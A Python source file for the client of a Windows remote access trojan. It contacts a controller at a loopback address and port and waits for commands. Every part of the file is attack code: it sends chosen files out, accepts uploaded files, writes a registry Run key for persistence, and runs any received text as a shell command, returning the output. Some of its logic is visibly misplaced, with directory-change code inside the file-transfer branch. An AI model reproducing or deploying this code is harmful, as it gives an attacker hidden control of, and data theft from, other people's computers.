import socket
import subprocess
import os
import winreg as reg
import time

def AddToStartup(f_name, path):

    address=os.path.join(path, f_name)
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
    open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open, "any_name", 0, reg.REG_SZ, address)
    reg.CloseKey(open)

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connected = False

    while (connected == False):

        try:

            s.connect(('127.0.0.1', 5555))
            connected = True
            cwd = os.getcwd()
            s.send(("dir:" + str(cwd)).encode('utf-8'))

        except:

            print(".", end="")

    while True:
        try:

            command = s.recv(2048).strip().decode('utf-8')

            if 'terminate' in command:

                s.close()
                break

            elif command.startswith('grab'):

                file_name = command[5:]
                file_size = os.path.getsize(file_name)
                s.send(file_name.encode('utf-8'))
                s.recv(1024).decode('utf-8')
                s.send(str(file_size).encode('utf-8'))
                s.recv(1024).decode('utf-8')

                with open(file_name, "rb") as file:

                    c = 0
                    start_time = time.time()

                    while c < file_size:

                        data = file.read(1024)

                        if not (data):
                            break

                        s.sendall(data)
                        c += len(data)

                    end_time = time.time()

            elif 'transfer' in command:

                file_name = s.recv(1024).decode('utf-8')
                s.send('OK'.encode('utf-8'))
                file_size = s.recv(1024).decode('utf-8')
                s.send('OK'.encode('utf-8'))

                with open(file_name, "wb") as file:

                    c = 0
                    start_time = time.time()

                    while c < int(file_size):

                        data = s.recv(1024)

                        if not (data):
                            break

                        file.write(data)
                        c += len(data)

                    end_time = time.time()

                dir = command[3:]

                try:

                    os.chdir(dir)

                except:

                    os.chdir(cwd)

                cwd = os.getcwd()
                s.send(("dir:" + str(cwd)).encode('utf-8'))

            elif command.startswith('startup'):

                file_name = command[8:]
                pth = os.getcwd()

                try:

                    AddToStartup(file_name, pth)
                    s.send("OK".encode('utf-8'))

                except Exception as e:

                    s.send(str(e).encode('utf-8'))

            else:

                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                out = CMD.stdout.read()
                err = CMD.stderr.read()
                s.send(out)
                s.send(err)

                if (out == b'' and err == b''):

                    s.send("OK".encode('utf-8'))

        except Exception as e:

            s.send(str(e).encode('utf-8'))

connected = False

while (not connected):

    try:

        connect()
        connected = True

    except:

        print(".", end = "")